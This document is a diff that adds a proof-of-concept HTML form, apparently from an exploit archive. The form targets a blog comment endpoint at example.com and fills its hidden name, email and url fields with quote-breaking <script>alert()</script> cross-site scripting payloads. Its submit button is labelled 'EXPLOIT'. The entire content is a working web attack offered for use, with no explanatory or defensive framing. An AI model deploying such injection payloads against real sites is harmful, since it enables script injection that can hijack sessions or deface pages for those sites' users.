@@ -1,0 +1,6 @@
+&lt;form action=&quot;http://www.example.com/index.php?x=entry:entry110603-123922;comments:1&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(2);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(3);&lt;/script&gt;&#039;&gt;
+&lt;input name=&quot;send&quot; value=&quot;EXPLOIT&quot; type=&quot;submit&quot;&gt;
+&lt;/form&gt;
